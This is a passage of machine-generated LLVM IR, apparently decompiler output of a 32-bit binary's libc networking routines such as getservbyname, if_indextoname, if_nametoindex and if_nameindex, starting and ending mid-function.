  %v0_806452e = call i32 @__GI_endservent()
  br label %dec_label_pc_8064533

dec_label_pc_8064533:                             ; preds = %dec_label_pc_8064525, %dec_label_pc_806452e
  %v3_806453c = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v1_8064545 = inttoptr i32 %arg6 to i32*
  %v2_8064545 = load i32, i32* %v1_8064545, align 4
  %v3_8064545 = icmp eq i32 %v2_8064545, 0
  %v1_8064553 = load i32, i32* @edi, align 4
  %v2_8064553 = select i1 %v3_8064545, i32 %v1_8064553, i32 0
  %v2_8064555 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8064555, i32* @ebx, align 4
  store i32 %v0_806447c, i32* @esi, align 4
  store i32 %v0_806447b, i32* @edi, align 4
  store i32 %v0_806447a, i32* @ebp, align 4
  ret i32 %v2_8064553

; uselistorder directives
  uselistorder i32 %v5_8064517, { 1, 0, 2 }
  uselistorder i32 %v2_80644ec, { 1, 2, 0 }
  uselistorder i32 %v1_80644e9, { 1, 0 }
  uselistorder i32 ()* @__GI_endservent, { 1, 0 }
  uselistorder i32 (i32)* @setservent, { 1, 0 }
  uselistorder i8* @global_var_807d278.821, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8074884.813 to i32), { 5, 0, 6, 1, 7, 2, 8, 3, 9, 10, 4 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_8064533, { 1, 0 }
  uselistorder label %dec_label_pc_8064525, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806450a, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80644d6, { 1, 0 }
}

define i32 @getservbyname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_806455d = call i32 @__initbuf()
  %v2_8064564 = ptrtoint i32* %stack_var_-4 to i32
  %v0_806456e = load i32, i32* @global_var_807d260.812, align 32
  %v9_8064581 = call i32 @getservbyname_r(i32 %arg1, i32 %arg2, i32* nonnull @global_var_807d268.820, i32 %v0_806456e, i32 4237, i32 %v2_8064564, i32 %v0_806455d, i32 %v0_806455d)
  %v3_8064586 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_8064586

; uselistorder directives
  uselistorder i32 (i32, i32, i32*, i32, i32, i32, i32, i32)* @getservbyname_r, { 1, 0 }
  uselistorder i32* @global_var_807d268.820, { 0, 2, 1 }
  uselistorder i32 ()* @__initbuf, { 2, 1, 0 }
}

define i32 @if_indextoname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8064590 = load i32, i32* @edi, align 4
  %v0_8064591 = load i32, i32* @esi, align 4
  %v0_8064592 = load i32, i32* @ebx, align 4
  %v12_8064593 = ptrtoint i32* %stack_var_-44 to i32
  %v3_8064596 = call i32 @__opensock(i32 %v0_8064592, i32 %v0_8064591, i32 %v0_8064590)
  store i32 %v3_8064596, i32* @esi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_806459f = icmp slt i32 %v3_8064596, 0
  br i1 %v2_806459f, label %dec_label_pc_8064600, label %dec_label_pc_80645a3

dec_label_pc_80645a3:                             ; preds = %entry
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %v12_8064593, i32* @ebx, align 4
  store i32 %v3_8064596, i32* %stack_var_-60, align 4
  %v3_80645b7 = call i32 @ioctl(i32 %v3_8064596, i32 35088, i32 %v12_8064593)
  store i32 %v3_80645b7, i32* %eax.global-to-local, align 4
  %v2_80645bf = icmp slt i32 %v3_80645b7, 0
  %v1_80645c1 = icmp eq i1 %v2_80645bf, false
  br i1 %v1_80645c1, label %dec_label_pc_80645e5, label %dec_label_pc_80645c3

dec_label_pc_80645c3:                             ; preds = %dec_label_pc_80645a3
  %v0_80645c3 = load i32, i32* %stack_var_-60, align 4
  %v1_80645c3 = call i32 @__errno_location(i32 %v0_80645c3)
  store i32 %v1_80645c3, i32* %eax.global-to-local, align 4
  store i32 %v1_80645c3, i32* @edi, align 4
  %v1_80645cd = inttoptr i32 %v1_80645c3 to i32*
  %v2_80645cd = load i32, i32* %v1_80645cd, align 4
  store i32 %v2_80645cd, i32* @ebx, align 4
  store i32 %v3_8064596, i32* %stack_var_-60, align 4
  %v1_80645d0 = call i32 @__libc_close(i32 %v3_8064596)
  store i32 %v1_80645d0, i32* %eax.global-to-local, align 4
  %v0_80645d8 = load i32, i32* @ebx, align 4
  %v9_80645d8 = icmp eq i32 %v0_80645d8, 19
  %v1_80645db = icmp eq i1 %v9_80645d8, false
  br i1 %v1_80645db, label %dec_label_pc_80645df, label %dec_label_pc_80645dd

dec_label_pc_80645dd:                             ; preds = %dec_label_pc_80645c3
  %v1_80645dd = and i32 %v0_80645d8, -256
  %v2_80645dd = or i32 %v1_80645dd, 6
  br label %dec_label_pc_80645df

dec_label_pc_80645df:                             ; preds = %dec_label_pc_80645c3, %dec_label_pc_80645dd
  %v0_80645e1 = phi i32 [ %v0_80645d8, %dec_label_pc_80645c3 ], [ %v2_80645dd, %dec_label_pc_80645dd ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_80645e1 = load i32, i32* @edi, align 4
  %v2_80645e1 = inttoptr i32 %v1_80645e1 to i32*
  store i32 %v0_80645e1, i32* %v2_80645e1, align 4
  %v0_8064606.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064600

dec_label_pc_80645e5:                             ; preds = %dec_label_pc_80645a3
  store i32 %v3_8064596, i32* %stack_var_-60, align 4
  %v1_80645e9 = call i32 @__libc_close(i32 %v3_8064596)
  store i32 %v1_80645e9, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v3_80645f8 = inttoptr i32 %arg2 to i8*
  %v4_80645f8 = call i32 @strncpy(i8* %v3_80645f8, i32 %v12_8064593, i32 16)
  store i32 %v4_80645f8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064600

dec_label_pc_8064600:                             ; preds = %entry, %dec_label_pc_80645df, %dec_label_pc_80645e5
  %v0_8064606 = phi i32 [ 0, %entry ], [ %v0_8064606.pre, %dec_label_pc_80645df ], [ %v4_80645f8, %dec_label_pc_80645e5 ]
  ret i32 %v0_8064606

; uselistorder directives
  uselistorder i32 %v0_80645d8, { 1, 2, 0 }
  uselistorder i32 %v1_80645c3, { 1, 0, 2 }
  uselistorder i32 %v3_8064596, { 3, 2, 1, 0, 6, 5, 4, 7 }
  uselistorder i32 %v12_8064593, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 0, 4 }
  uselistorder i32 19, { 0, 4, 2, 1, 5, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8064600, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80645df, { 1, 0 }
}

define i32 @__GI_if_nametoindex() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8064607 = load i32, i32* @edi, align 4
  %v0_8064608 = load i32, i32* @esi, align 4
  %v0_8064609 = load i32, i32* @ebx, align 4
  store i32 %v0_8064609, i32* %stack_var_-12, align 4
  %v12_806460a = ptrtoint i32* %stack_var_-44 to i32
  %v3_806460d = call i32 @__opensock(i32 %v0_8064609, i32 %v0_8064608, i32 %v0_8064607)
  store i32 %v3_806460d, i32* @esi, align 4
  %v2_8064614 = icmp slt i32 %v3_806460d, 0
  br i1 %v2_8064614, label %dec_label_pc_8064673, label %dec_label_pc_8064618

dec_label_pc_8064618:                             ; preds = %entry
  store i32 %v12_806460a, i32* @ebx, align 4
  store i32 %v12_806460a, i32* %stack_var_-60, align 4
  %v3_8064624 = bitcast i32* %stack_var_-44 to i8*
  %v4_8064624 = call i32 @strncpy(i8* %v3_8064624, i32 %tmp3, i32 16)
  %v0_8064632 = load i32, i32* @esi, align 4
  store i32 %v0_8064632, i32* %stack_var_-60, align 4
  %v3_8064633 = call i32 @ioctl(i32 %v0_8064632, i32 35123, i32 %v12_806460a)
  %v2_806463b = icmp slt i32 %v3_8064633, 0
  %v1_806463d = icmp eq i1 %v2_806463b, false
  br i1 %v1_806463d, label %dec_label_pc_8064661, label %dec_label_pc_806463f

dec_label_pc_806463f:                             ; preds = %dec_label_pc_8064618
  %v0_806463f = load i32, i32* %stack_var_-60, align 4
  %v1_806463f = call i32 @__errno_location(i32 %v0_806463f)
  store i32 %v1_806463f, i32* @edi, align 4
  %v1_8064649 = inttoptr i32 %v1_806463f to i32*
  %v2_8064649 = load i32, i32* %v1_8064649, align 4
  store i32 %v2_8064649, i32* @ebx, align 4
  %v0_806464b = load i32, i32* @esi, align 4
  store i32 %v0_806464b, i32* %stack_var_-60, align 4
  %v1_806464c = call i32 @__libc_close(i32 %v0_806464b)
  %v0_8064654 = load i32, i32* @ebx, align 4
  %v9_8064654 = icmp eq i32 %v0_8064654, 22
  %v1_8064657 = icmp eq i1 %v9_8064654, false
  br i1 %v1_8064657, label %dec_label_pc_8064673, label %dec_label_pc_8064659

dec_label_pc_8064659:                             ; preds = %dec_label_pc_806463f
  %v0_8064659 = load i32, i32* @edi, align 4
  %v1_8064659 = inttoptr i32 %v0_8064659 to i32*
  store i32 38, i32* %v1_8064659, align 4
  br label %dec_label_pc_8064673

dec_label_pc_8064661:                             ; preds = %dec_label_pc_8064618
  %v0_8064664 = load i32, i32* @esi, align 4
  store i32 %v0_8064664, i32* %stack_var_-60, align 4
  %v1_8064665 = call i32 @__libc_close(i32 %v0_8064664)
  br label %dec_label_pc_8064675

dec_label_pc_8064673:                             ; preds = %dec_label_pc_806463f, %entry, %dec_label_pc_8064659
  br label %dec_label_pc_8064675

dec_label_pc_8064675:                             ; preds = %dec_label_pc_8064661, %dec_label_pc_8064673
  %v0_806467b = phi i32 [ %tmp, %dec_label_pc_8064661 ], [ 0, %dec_label_pc_8064673 ]
  %v2_8064678 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8064678, i32* @ebx, align 4
  store i32 %v0_8064608, i32* @esi, align 4
  store i32 %v0_8064607, i32* @edi, align 4
  ret i32 %v0_806467b

; uselistorder directives
  uselistorder i32 %v1_806463f, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_8064675, { 1, 0 }
  uselistorder label %dec_label_pc_8064673, { 2, 0, 1 }
}

define i32 @__GI_if_nameindex() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_806467f = load i32, i32* @edi, align 4
  %v0_8064680 = load i32, i32* @esi, align 4
  %v0_8064681 = load i32, i32* @ebx, align 4
  store i32 %v0_8064681, i32* %stack_var_-16, align 4
  %v3_8064685 = call i32 @__opensock(i32 %v0_8064681, i32 %v0_8064680, i32 %v0_806467f)
  store i32 %v3_8064685, i32* %eax.global-to-local, align 4
  %v2_8064694 = icmp slt i32 %v3_8064685, 0
  br i1 %v2_8064694, label %dec_label_pc_806480b, label %dec_label_pc_806469c

dec_label_pc_806469c:                             ; preds = %entry
  %v2_80646c9 = ptrtoint i32* %stack_var_-24 to i32
  %v0_80646b1.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80646a8

dec_label_pc_80646a8:                             ; preds = %dec_label_pc_80646e7, %dec_label_pc_806469c
  %v0_80646b1 = phi i32 [ %v0_80646b1.pre, %dec_label_pc_806469c ], [ %v1_80646e0, %dec_label_pc_80646e7 ]
  %v0_80646c2 = phi i32 [ 128, %dec_label_pc_806469c ], [ %v1_80646ea, %dec_label_pc_80646e7 ]
  %stack_var_-20.0 = phi i32 [ 0, %dec_label_pc_806469c ], [ %v0_80646d5, %dec_label_pc_80646e7 ]
  %v2_80646a8 = mul i32 %v0_80646c2, 2
  %v1_80646ab = add i32 %v2_80646a8, 30
  %v1_80646ae = and i32 %v1_80646ab, -16
  %v2_80646b1 = sub i32 %v0_80646b1, %v1_80646ae
  %v1_80646b3 = add i32 %v2_80646b1, 15
  %v1_80646b7 = and i32 %v1_80646b3, -16
  store i32 %v1_80646b7, i32* %edx.global-to-local, align 4
  %v2_80646ba = add i32 %v1_80646b7, %v2_80646a8
  store i32 %v2_80646ba, i32* %eax.global-to-local, align 4
  %v15_80646bd = icmp eq i32 %v2_80646ba, %stack_var_-20.0
  %v1_80646c0 = icmp eq i1 %v15_80646bd, false
  br i1 %v1_80646c0, label %dec_label_pc_80646c8, label %dec_label_pc_80646c2

dec_label_pc_80646c2:                             ; preds = %dec_label_pc_80646a8
  %v2_80646c2 = mul i32 %v0_80646c2, 3
  br label %dec_label_pc_80646c8

dec_label_pc_80646c8:                             ; preds = %dec_label_pc_80646a8, %dec_label_pc_80646c2
  %storemerge = phi i32 [ %v2_80646c2, %dec_label_pc_80646c2 ], [ %v2_80646a8, %dec_label_pc_80646a8 ]
  store i32 %storemerge, i32* @ebx, align 4
  %v2_80646c8 = add i32 %v2_80646b1, -4
  %v3_80646c8 = inttoptr i32 %v2_80646c8 to i32*
  store i32 %v2_80646ba, i32* %v3_80646c8, align 4
  store i32 %v2_80646c9, i32* %eax.global-to-local, align 4
  %v2_80646cc = add i32 %v2_80646b1, -8
  %v3_80646cc = inttoptr i32 %v2_80646cc to i32*
  store i32 %v2_80646c9, i32* %v3_80646cc, align 4
  %v1_80646cd = add i32 %v2_80646b1, -12
  %v2_80646cd = inttoptr i32 %v1_80646cd to i32*
  store i32 35090, i32* %v2_80646cd, align 4
  %v5_80646d2 = add i32 %v2_80646b1, -16
  %v6_80646d2 = inttoptr i32 %v5_80646d2 to i32*
  store i32 %v3_8064685, i32* %v6_80646d2, align 4
  %v0_80646d5 = load i32, i32* %edx.global-to-local, align 4
  %v0_80646d8 = load i32, i32* @ebx, align 4
  store i32 %v0_80646d8, i32* %stack_var_-24, align 4
  %v2_80646db = load i32, i32* %stack_var_-16, align 4
  %v3_80646db = call i32 @ioctl(i32 %v0_80646d8, i32 %v0_80646d5, i32 %v2_80646db)
  store i32 %v3_80646db, i32* %eax.global-to-local, align 4
  %v0_80646e0 = load i32, i32* @esp, align 4
  %v2_80646e3 = icmp slt i32 %v3_80646db, 0
  br i1 %v2_80646e3, label %dec_label_pc_806472f, label %dec_label_pc_80646e7

dec_label_pc_80646e7:                             ; preds = %dec_label_pc_80646c8
  %v1_80646e0 = add i32 %v0_80646e0, 16
  %v3_80646e7 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_80646e7, i32* %eax.global-to-local, align 4
  %v1_80646ea = load i32, i32* @ebx, align 4
  %v12_80646ea = icmp eq i32 %v3_80646e7, %v1_80646ea
  br i1 %v12_80646ea, label %dec_label_pc_80646a8, label %dec_label_pc_80646ee

dec_label_pc_80646ee:                             ; preds = %dec_label_pc_80646e7
  %v2_80646ee = udiv i32 %v3_80646e7, 32
  store i32 0, i32* @edi, align 4
  %v1_80646f9 = mul nuw nsw i32 %v2_80646ee, 8
  %v2_80646f9 = add nuw i32 %v1_80646f9, 8
  store i32 %v2_80646f9, i32* %eax.global-to-local, align 4
  %v3_8064700 = inttoptr i32 %v0_80646e0 to i32*
  store i32 %v2_80646f9, i32* %v3_8064700, align 4
  %v1_8064701 = call i32 @malloc(i32 %v2_80646ee)
  store i32 %v1_8064701, i32* %eax.global-to-local, align 4
  %v0_8064706 = load i32, i32* @esp, align 4
  %v1_806470c = icmp eq i32 %v1_8064701, 0
  %v1_806470e = icmp eq i1 %v1_806470c, false
  br i1 %v1_806470e, label %dec_label_pc_80647e1.preheader, label %dec_label_pc_8064714

dec_label_pc_80647e1.preheader:                   ; preds = %dec_label_pc_80646ee
  %v1_8064706 = add i32 %v0_8064706, 16
  %v1_8064758 = inttoptr i32 %v1_8064701 to i8*
  %v0_80647e130 = load i32, i32* @edi, align 4
  %v10_80647e132 = icmp ult i32 %v0_80647e130, %v2_80646ee
  br i1 %v10_80647e132, label %dec_label_pc_8064746, label %dec_label_pc_80647ea

dec_label_pc_8064714:                             ; preds = %dec_label_pc_80646ee
  %v6_8064717 = inttoptr i32 %v0_8064706 to i32*
  store i32 %v3_8064685, i32* %v6_8064717, align 4
  %v1_806471a = call i32 @__libc_close(i32 %v1_8064701)
  store i32 %v1_806471a, i32* %eax.global-to-local, align 4
  %v1_806471f = call i32 @__errno_location(i32 %v1_8064701)
  store i32 %v1_806471f, i32* %eax.global-to-local, align 4
  %v1_8064724 = inttoptr i32 %v1_806471f to i32*
  store i32 105, i32* %v1_8064724, align 4
  br label %dec_label_pc_8064808

dec_label_pc_806472f:                             ; preds = %dec_label_pc_80646c8
  %v6_8064732 = inttoptr i32 %v0_80646e0 to i32*
  store i32 %v3_8064685, i32* %v6_8064732, align 4
  %v1_8064735 = call i32 @__libc_close(i32 0)
  store i32 %v1_8064735, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064808

dec_label_pc_8064746:                             ; preds = %dec_label_pc_80647db, %dec_label_pc_80647e1.preheader
  %v0_8064748 = phi i32 [ %v1_8064706, %dec_label_pc_80647e1.preheader ], [ %v0_8064748.pre, %dec_label_pc_80647db ]
  %v0_80647e137 = phi i32 [ %v0_80647e130, %dec_label_pc_80647e1.preheader ], [ %v0_80647e1, %dec_label_pc_80647db ]
  %v2_806474b = mul i32 %v0_80647e137, 32
  store i32 %v1_8064701, i32* %eax.global-to-local, align 4
  %v5_8064751 = add i32 %v2_806474b, %v0_80646d5
  store i32 %v5_8064751, i32* @ebx, align 4
  %v2_8064754 = mul i32 %v0_80647e137, 8
  %v3_8064754 = add i32 %v2_8064754, %v1_8064701
  store i32 %v3_8064754, i32* @esi, align 4
  %v2_8064757 = add i32 %v0_8064748, -16
  %v3_8064757 = inttoptr i32 %v2_8064757 to i32*
  store i32 %v5_8064751, i32* %v3_8064757, align 4
  %v2_8064758 = call i32 @__GI_strdup(i8* %v1_8064758)
  store i32 %v2_8064758, i32* %eax.global-to-local, align 4
  %v1_8064760 = load i32, i32* @esi, align 4
  %v2_8064760 = add i32 %v1_8064760, 4
  %v3_8064760 = inttoptr i32 %v2_8064760 to i32*
  store i32 %v2_8064758, i32* %v3_8064760, align 4
  %v1_8064763 = icmp eq i32 %v2_8064758, 0
  br i1 %v1_8064763, label %dec_label_pc_806477d, label %dec_label_pc_8064767

dec_label_pc_8064767:                             ; preds = %dec_label_pc_8064746
  %v1_8064767 = load i32, i32* @esp, align 4
  %v2_8064767 = add i32 %v1_8064767, -4
  %v3_8064767 = inttoptr i32 %v2_8064767 to i32*
  store i32 %v2_8064758, i32* %v3_8064767, align 4
  %v0_8064768 = load i32, i32* @ebx, align 4
  %v2_8064768 = add i32 %v1_8064767, -8
  %v3_8064768 = inttoptr i32 %v2_8064768 to i32*
  store i32 %v0_8064768, i32* %v3_8064768, align 4
  %v1_8064769 = add i32 %v1_8064767, -12
  %v2_8064769 = inttoptr i32 %v1_8064769 to i32*
  store i32 35123, i32* %v2_8064769, align 4
  %v5_806476e = add i32 %v1_8064767, -16
  %v6_806476e = inttoptr i32 %v5_806476e to i32*
  store i32 %v3_8064685, i32* %v6_806476e, align 4
  %v3_8064771 = call i32 @ioctl(i32 %v1_8064701, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8064771, i32* %eax.global-to-local, align 4
  %v2_8064779 = icmp slt i32 %v3_8064771, 0
  %v1_806477b = icmp eq i1 %v2_8064779, false
  br i1 %v1_806477b, label %dec_label_pc_80647db, label %dec_label_pc_806477d

dec_label_pc_806477d:                             ; preds = %dec_label_pc_8064767, %dec_label_pc_8064746
  %v1_806477d = call i32 @__errno_location(i32 %v1_8064701)
  store i32 %v1_806477d, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8064787 = inttoptr i32 %v1_806477d to i32*
  %v2_8064787 = load i32, i32* %v1_8064787, align 4
  store i32 %v2_8064787, i32* @esi, align 4
  %v1_806479e23 = load i32, i32* @edi, align 4
  %v7_806479e25 = icmp eq i32 %v1_806479e23, 0
  br i1 %v7_806479e25, label %dec_label_pc_806477d.dec_label_pc_80647a2_crit_edge, label %dec_label_pc_806478b.lr.ph

dec_label_pc_806477d.dec_label_pc_80647a2_crit_edge: ; preds = %dec_label_pc_806477d
  %v0_80647a2.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80647a2

dec_label_pc_806478b.lr.ph:                       ; preds = %dec_label_pc_806477d
  %v3_8064791 = add i32 %v1_8064701, 4
  %v0_806478e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_806478b

dec_label_pc_806478b:                             ; preds = %dec_label_pc_806478b.lr.ph, %dec_label_pc_806478b
  %v0_806478e = phi i32 [ %v0_806478e.pre, %dec_label_pc_806478b.lr.ph ], [ %v1_806479b, %dec_label_pc_806478b ]
  %v1_806479129 = phi i32 [ 0, %dec_label_pc_806478b.lr.ph ], [ %v0_806479e.pre, %dec_label_pc_806478b ]
  store i32 %v1_8064701, i32* %edx.global-to-local, align 4
  %v2_8064791 = mul i32 %v1_806479129, 8
  %v4_8064791 = add i32 %v3_8064791, %v2_8064791
  %v5_8064791 = inttoptr i32 %v4_8064791 to i32*
  %v6_8064791 = load i32, i32* %v5_8064791, align 4
  %v8_8064791 = add i32 %v0_806478e, -16
  %v9_8064791 = inttoptr i32 %v8_8064791 to i32*
  store i32 %v6_8064791, i32* %v9_8064791, align 4
  %v0_8064795 = load i32, i32* @ebx, align 4
  %v1_8064795 = add i32 %v0_8064795, 1
  store i32 %v1_8064795, i32* @ebx, align 4
  %v1_8064796 = call i32 @free(i32 %v1_806477d)
  store i32 %v1_8064796, i32* %eax.global-to-local, align 4
  %v0_806479b = load i32, i32* @esp, align 4
  %v1_806479b = add i32 %v0_806479b, 16
  %v0_806479e.pre = load i32, i32* @ebx, align 4
  %v1_806479e = load i32, i32* @edi, align 4
  %v7_806479e = icmp ult i32 %v0_806479e.pre, %v1_806479e
  br i1 %v7_806479e, label %dec_label_pc_806478b, label %dec_label_pc_80647a2

dec_label_pc_80647a2:                             ; preds = %dec_label_pc_806478b, %dec_label_pc_806477d.dec_label_pc_80647a2_crit_edge
  %v0_80647a2 = phi i32 [ %v0_80647a2.pre, %dec_label_pc_806477d.dec_label_pc_80647a2_crit_edge ], [ %v1_806479b, %dec_label_pc_806478b ]
  %v5_80647a5 = add i32 %v0_80647a2, -16
  %v6_80647a5 = inttoptr i32 %v5_80647a5 to i32*
  store i32 %v1_8064701, i32* %v6_80647a5, align 4
  %v1_80647a8 = call i32 @free(i32 %v1_806477d)
  store i32 %v1_80647a8, i32* %eax.global-to-local, align 4
  %v0_80647ad = load i32, i32* @esp, align 4
  %v1_80647ad = inttoptr i32 %v0_80647ad to i32*
  %v2_80647ad = load i32, i32* %v1_80647ad, align 4
  store i32 %v2_80647ad, i32* @ecx, align 4
  store i32 %v3_8064685, i32* %v1_80647ad, align 4
  %v1_80647b1 = call i32 @__libc_close(i32 %v1_806477d)
  store i32 %v1_80647b1, i32* %eax.global-to-local, align 4
  %v0_80647b9 = load i32, i32* @esi, align 4
  %v9_80647b9 = icmp eq i32 %v0_80647b9, 22
  %v1_80647bc = icmp eq i1 %v9_80647b9, false
  br i1 %v1_80647bc, label %dec_label_pc_80647c4, label %dec_label_pc_80647be

dec_label_pc_80647be:                             ; preds = %dec_label_pc_80647a2
  %v1_80647be = and i32 %v0_80647b9, -65536
  %v2_80647be = or i32 %v1_80647be, 38
  br label %dec_label_pc_80647cd

dec_label_pc_80647c4:                             ; preds = %dec_label_pc_80647a2
  %v9_80647c4 = icmp eq i32 %v0_80647b9, 12
  %v1_80647c7 = icmp eq i1 %v9_80647c4, false
  br i1 %v1_80647c7, label %dec_label_pc_80647cd, label %dec_label_pc_80647c9

dec_label_pc_80647c9:                             ; preds = %dec_label_pc_80647c4
  %v1_80647c9 = and i32 %v0_80647b9, -65536
  %v2_80647c9 = or i32 %v1_80647c9, 105
  br label %dec_label_pc_80647cd

dec_label_pc_80647cd:                             ; preds = %dec_label_pc_80647c4, %dec_label_pc_80647be, %dec_label_pc_80647c9
  %v0_80647d0 = phi i32 [ %v0_80647b9, %dec_label_pc_80647c4 ], [ %v2_80647be, %dec_label_pc_80647be ], [ %v2_80647c9, %dec_label_pc_80647c9 ]
  store i32 %v1_806477d, i32* %eax.global-to-local, align 4
  store i32 %v0_80647d0, i32* %v1_8064787, align 4
  br label %dec_label_pc_806480b

dec_label_pc_80647db:                             ; preds = %dec_label_pc_8064767
  %v0_80647db = load i32, i32* @ebx, align 4
  %v1_80647db = add i32 %v0_80647db, 16
  %v2_80647db = inttoptr i32 %v1_80647db to i32*
  %v3_80647db = load i32, i32* %v2_80647db, align 4
  store i32 %v3_80647db, i32* %eax.global-to-local, align 4
  %v0_80647de = load i32, i32* @edi, align 4
  %v1_80647de = add i32 %v0_80647de, 1
  store i32 %v1_80647de, i32* @edi, align 4
  %v1_80647df = load i32, i32* @esi, align 4
  %v2_80647df = inttoptr i32 %v1_80647df to i32*
  store i32 %v3_80647db, i32* %v2_80647df, align 4
  %v0_80647e1 = load i32, i32* @edi, align 4
  %v10_80647e1 = icmp ult i32 %v0_80647e1, %v2_80646ee
  %v0_8064748.pre = load i32, i32* @esp, align 4
  br i1 %v10_80647e1, label %dec_label_pc_8064746, label %dec_label_pc_80647ea

dec_label_pc_80647ea:                             ; preds = %dec_label_pc_80647db, %dec_label_pc_80647e1.preheader
  %v0_80647e1.lcssa = phi i32 [ %v0_80647e130, %dec_label_pc_80647e1.preheader ], [ %v0_80647e1, %dec_label_pc_80647db ]
  store i32 %v1_8064701, i32* %edx.global-to-local, align 4
  %v2_80647f0 = mul i32 %v0_80647e1.lcssa, 8
  %v3_80647f0 = add i32 %v2_80647f0, %v1_8064701
  store i32 %v3_80647f0, i32* %eax.global-to-local, align 4
  %v1_80647f3 = inttoptr i32 %v3_80647f0 to i32*
  store i32 0, i32* %v1_80647f3, align 4
  %v0_80647f9 = load i32, i32* %eax.global-to-local, align 4
  %v1_80647f9 = add i32 %v0_80647f9, 4
  %v2_80647f9 = inttoptr i32 %v1_80647f9 to i32*
  store i32 0, i32* %v2_80647f9, align 4
  %v4_8064800 = load i32, i32* @esp, align 4
  %v5_8064800 = add i32 %v4_8064800, -4
  %v6_8064800 = inttoptr i32 %v5_8064800 to i32*
  store i32 %v3_8064685, i32* %v6_8064800, align 4
  %v1_8064803 = call i32 @__libc_close(i32 %v1_8064701)
  store i32 %v1_8064803, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064808

dec_label_pc_8064808:                             ; preds = %dec_label_pc_806472f, %dec_label_pc_8064714, %dec_label_pc_80647ea
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_806472f ], [ %v1_8064701, %dec_label_pc_80647ea ], [ %v1_8064701, %dec_label_pc_8064714 ]
  br label %dec_label_pc_806480b

dec_label_pc_806480b:                             ; preds = %entry, %dec_label_pc_80647cd, %dec_label_pc_8064808
  %stack_var_-36.1 = phi i32 [ 0, %entry ], [ %stack_var_-36.0, %dec_label_pc_8064808 ], [ 0, %dec_label_pc_80647cd ]
  store i32 %stack_var_-36.1, i32* %eax.global-to-local, align 4
  ret i32 %stack_var_-36.1

; uselistorder directives
  uselistorder i32 %stack_var_-36.1, { 1, 0 }
  uselistorder i32 %v0_80647e1, { 0, 2, 1 }
  uselistorder i32 %v0_80647b9, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v2_8064758, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80647e137, { 1, 0 }
  uselistorder i32 %v1_8064701, { 3, 6, 7, 0, 8, 10, 11, 2, 12, 9, 1, 14, 5, 4, 13, 15, 16 }
  uselistorder i32 %v2_80646ee, { 0, 3, 1, 2 }
  uselistorder i32 %v3_80646e7, { 1, 0, 2 }
  uselistorder i32 %v0_80646d5, { 0, 2, 1 }
  uselistorder i32 %v2_80646ba, { 1, 0, 2 }
  uselistorder i32 %v2_80646b1, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_80646a8, { 1, 2, 0 }
  uselistorder i32 %v0_80646c2, { 1, 0 }
  uselistorder i32 %v3_8064685, { 1, 3, 2, 4, 0, 5, 6, 7 }
  uselistorder i32 38, { 5, 6, 4, 11, 0, 1, 7, 8, 9, 10, 2, 3 }
  uselistorder i32 35123, { 1, 0 }
  uselistorder i32 105, { 2, 3, 1, 0 }
  uselistorder i32 30, { 21, 22, 16, 1, 17, 18, 19, 20, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 (i32, i32, i32)* @__opensock, { 2, 1, 0 }
  uselistorder label %dec_label_pc_806480b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8064808, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80647cd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806478b, { 1, 0 }
  uselistorder label %dec_label_pc_80646c8, { 1, 0 }
}

define i32 @__GI_if_freenameindex(i32* %arg1) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v0_8064816 = load i32, i32* @esi, align 4
  %v0_8064817 = load i32, i32* @ebx, align 4
  store i32 %v0_8064817, i32* %stack_var_-8, align 4
  store i32 %tmp3, i32* @esi, align 4
  br label %dec_label_pc_8064832

